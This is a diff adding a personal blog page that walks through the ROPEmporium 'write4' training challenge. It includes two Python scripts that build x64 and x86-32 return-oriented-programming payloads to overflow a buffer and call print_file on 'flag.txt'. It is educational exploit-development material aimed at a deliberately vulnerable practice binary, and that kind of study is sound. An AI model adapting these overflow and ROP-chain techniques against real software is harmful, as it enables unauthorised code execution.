@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>write4 | ROPEmporium [4] - Arzedlab 🪵</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Functions themselves are in an external library we should call it from there. Imported files proves the command rabin2 -i &lt;binary&gt;" />
+	<meta property="og:image" content=""/>
+	<meta property="og:url" content="http://localhost:1313/posts/ropemporium_write4/">
+  <meta property="og:site_name" content="Arzedlab 🪵">
+  <meta property="og:title" content="write4 | ROPEmporium [4]">
+  <meta property="og:description" content="Functions themselves are in an external library we should call it from there. Imported files proves the command rabin2 -i &lt;binary&gt;">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-11-12T15:45:36+05:00">
+    <meta property="article:modified_time" content="2024-11-12T15:45:36+05:00">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="ROPEmporium">
+    <meta property="article:tag" content="ROP">
+    <meta property="article:tag" content="Chain">
+    <meta property="article:tag" content="Exploitation">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="write4 | ROPEmporium [4]">
+  <meta name="twitter:description" content="Functions themselves are in an external library we should call it from there. Imported files proves the command rabin2 -i &lt;binary&gt;">
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.7198d56e4fe53ab4610aa7f913b8d3fa7453003ac7791c64a6d6157aecbbced5.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"   />
+	
+
+	
+	
+
+	
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">Arzedlab 🪵</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		<a href="/tags">Tags</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">write4 | ROPEmporium [4]</h1>
+			<div class="meta">Posted on Nov 12, 2024</div>
+		</div>
+		
+		<div class="tldr">
+			<strong>tl;dr:</strong>
+			ROPEmporium - 4, write4 task writeup
+		</div>
+
+		
+		<div class="toc">
+		<strong>Table of contents:</strong>
+		<nav id="TableOfContents">
+  <ul>
+    <li><a href="#x64---rop-chain">x64 - ROP Chain</a></li>
+    <li><a href="#x64---gadgets">x64 - Gadgets</a></li>
+    <li><a href="#x64---more-gadgets">x64 - More gadgets</a></li>
+    <li><a href="#x64---payload">x64 - Payload</a></li>
+    <li><a href="#x64---result">x64 - Result</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#x86-32---payload">x86-32 - Payload</a></li>
+    <li><a href="#x86-32---result">x86-32 - Result</a></li>
+  </ul>
+</nav>
+		</div>
+
+		<section class="body">
+			<h1 id="write4">write4</h1>
+<p>“write4” challenge, read the description of the task and then come here</p>
+<hr>
+<p>Task:</p>
+<ul>
+<li>The string <code>flag.txt</code> isn’t in binary, but we must call the function <code>print_file</code>, which prints the file’s content.</li>
+</ul>
+<hr>
+<p>Functions themselves are in an external library we should call it from there. Imported files proves the command <code>rabin2 -i &lt;binary&gt;</code></p>
+<p><img src="image.png" alt="image.png"></p>
+<p>It gives addresses.</p>
+<p>Buffer overflow offset is the same, and <code>checksec</code>  security features of binary are also the same with the previous challenge (in short, this means that no randomization in memory will prevent us from doing ROPs)</p>
+<hr>
+<h2 id="x64---rop-chain">x64 - ROP Chain</h2>
+<p>We need to build the ROP chain:</p>
+<ul>
+<li><code>pop rdi; ret</code>  - gadget to put the argument into a function</li>
+<li><code>print_file@plt</code> - address to call it</li>
+<li>we need a section with a write permission address where we can write our string <code>flag.txt</code></li>
+<li>And the gadget like  <code>mov [reg], reg</code>  to insert the flag into memory from the register
+<ul>
+<li><code>[reg]</code>  - address which points to memory</li>
+<li><code>reg</code>  - value <code>flag.txt</code>  in binary format</li>
+</ul>
+</li>
+</ul>
+<h2 id="x64---gadgets">x64 - Gadgets</h2>
+<p><code>pop rdi; ret</code>  - gadget found by command <code>rp++ -r3 --unique -f ./write4 | grep &quot;pop rdi&quot;</code></p>
+<p><img src="image1.png" alt="image.png"></p>
+<p><code>print_file@plt</code>  - addresses got by command <code>rabin2 -i ./write4</code></p>
+<p><img src="image2.png" alt="image.png"></p>
+<hr>
+<p>we should place the string <code>flag.txt</code>  into memory, we search the sections with the command <code>readelf -S &lt;binary&gt;</code> which has permission write ( <code>W</code>  flag) in which we can write and read. One of them is <code>.bss</code> section.</p>
+<p><img src="70544342-a83b-4b93-8819-d06197c489dc.png" alt="image.png"></p>
+<ol>
+<li>address of <code>.**bss**</code></li>
+<li><strong><code>.bss</code></strong> write and read(it is actually default permission for ELF sections) permissions is <code>.bss</code> section</li>
+</ol>
+<p>We need a gadget to write the string <code>mov [reg], reg</code></p>
+<p><img src="image3.png" alt="image.png"></p>
+<p>Fortunately, we have one at address <code>0x400628</code>, in register <code>r14</code> will be the address where we will write (in our case <code>.bss</code> section’s address) and put the string itself in the <code>r15</code> register.</p>
+<h2 id="x64---more-gadgets">x64 - More gadgets</h2>
+<p>We need one more gadget to put our address and value into <code>r14</code> and <code>r15</code>  registers.</p>
+<p><img src="image4.png" alt="image.png"></p>
+<p><code>pop r14;  pop r15;  ret;</code>  - this gadget fits excellent.</p>
+<ul>
+<li><strong><code>r14</code></strong> -  address <code>.bss</code>  writable section address <code>0x601038</code></li>
+<li><strong><code>r15</code></strong> - value b’flag.txt` which is 8 bytes and fits well in one slot</li>
+</ul>
+<h2 id="x64---payload">x64 - Payload</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>from struct <span style="color:#ff79c6">import</span> pack
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_r14_r15      <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00400690</span>
+</span></span><span style="display:flex;"><span>writable_section <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00601038</span>
+</span></span><span style="display:flex;"><span>mov_ptr          <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00400628</span>
+</span></span><span style="display:flex;"><span>pop_rdi          <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x400693</span>
+</span></span><span style="display:flex;"><span>print_plt        <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000400510</span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x4004e6</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> b<span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">40</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># Write <span style="color:#f1fa8c">&#34;flag.txt&#34;</span> to writable memory
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, pop_r14_r15)  # pop r14; pop r15; ret
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, writable_section)  # r14 <span style="color:#ff79c6">=</span> writable section
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#39;flag.txt&#39;</span>  # r15 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;b flag.txt&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, mov_ptr)  # mov qword ptr [r14], r15; ret
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, pop_rdi)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, writable_section)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, print_plt)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># Output the payload
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">with</span> open(<span style="color:#f1fa8c">&#34;payload&#34;</span>, <span style="color:#f1fa8c">&#34;wb&#34;</span>) as f<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    f.write(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#f1fa8c">&#34;Payload written to &#39;payload&#39;&#34;</span>)
+</span></span></code></pre></div><h2 id="x64---result">x64 - Result</h2>
+<p><img src="image5.png" alt="image.png"></p>
+<h1 id="write4-32-bit">write4 32-bit</h1>
+<p>Here, because of address size is different, our string <code>flag.txt</code>  doesn&rsquo;t fit in our one 4-byte stack slot, which means we should divide it into two slots <code>flag</code> and <code>.txt</code></p>
+<p>Here if we search for the gadget for inserting strings into memory with the same command <code>rp++ -r2 --unique -f ./write432 | grep &quot;move&quot;</code> , we find the same functionality gadget but with different registers</p>
+<p><img src="image6.png" alt="image.png"></p>
+<p><code>mov [edi], ebp; ret</code>  - gadget</p>
+<ul>
+<li><code>edi</code>  - address writable section <code>.bss</code></li>
+<li><code>ebp</code>  - value</li>
+</ul>
+<p>We insert the strings one by one if the <code>.bss</code>  section address is equal to <code>0x0804a020</code> , we put our first string <code>flag</code> at address <code>0x0804a020</code>, and the second string will be inserted at address <code>0x0804a020 + 4</code> because one stack slot size is 4-byte.</p>
+<h2 id="x86-32---payload">x86-32 - Payload</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>from struct <span style="color:#ff79c6">import</span> pack
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_ebx          <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0804839d</span> 
+</span></span><span style="display:flex;"><span>writable_section <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0804a020</span>
+</span></span><span style="display:flex;"><span>mov_ptr          <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x08048543</span> # mov  [edi], ebp ; ret ;
+</span></span><span style="display:flex;"><span>pop_edi_pop_ebp  <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x080485aa</span> # pop edi ; pop ebp ; ret ;
+</span></span><span style="display:flex;"><span>print_plt        <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x080483d0</span> # print@plt 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> b<span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">44</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flag_part1 <span style="color:#ff79c6">=</span> b<span style="color:#f1fa8c">&#39;flag&#39;</span>
+</span></span><span style="display:flex;"><span>flag_part2 <span style="color:#ff79c6">=</span> b<span style="color:#f1fa8c">&#39;.txt&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># Write <span style="color:#f1fa8c">&#34;flag.txt&#34;</span> to writable memory
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, pop_edi_pop_ebp)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, writable_section)  # edi <span style="color:#ff79c6">=</span> writable section
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> flag_part1           # b<span style="color:#f1fa8c">&#39;flag&#39;</span> <span style="color:#ff79c6">=</span> ebp 
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, mov_ptr)  # mov  [edi], ebp ; ret ;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, pop_edi_pop_ebp)                         
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, writable_section <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>)  # edi <span style="color:#ff79c6">=</span> writable section
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> flag_part2           # b<span style="color:#f1fa8c">&#39;.txt&#39;</span> <span style="color:#ff79c6">=</span> ebp             
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, mov_ptr)  # mov  [edi], ebp ; ret ;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, print_plt)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, <span style="color:#bd93f9">0x0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, writable_section)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># Output the payload
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">with</span> open(<span style="color:#f1fa8c">&#34;payload&#34;</span>, <span style="color:#f1fa8c">&#34;wb&#34;</span>) as f<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    f.write(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#f1fa8c">&#34;Payload written to &#39;payload&#39;&#34;</span>)
+</span></span></code></pre></div><h2 id="x86-32---result">x86-32 - Result</h2>
+<p><img src="image7.png" alt="image.png"></p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/writeup">writeup</a></li>
+					
+					<li><a href="/tags/ropemporium">ROPEmporium</a></li>
+					
+					<li><a href="/tags/rop">ROP</a></li>
+					
+					<li><a href="/tags/chain">chain</a></li>
+					
+					<li><a href="/tags/exploitation">exploitation</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/arzedlab/" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://twitter.com/arzedlab/" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  © Ravshan | Made with Love ❤️ <a href="https://twitter.com/arzedlab/"> My Twitter 🪽</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
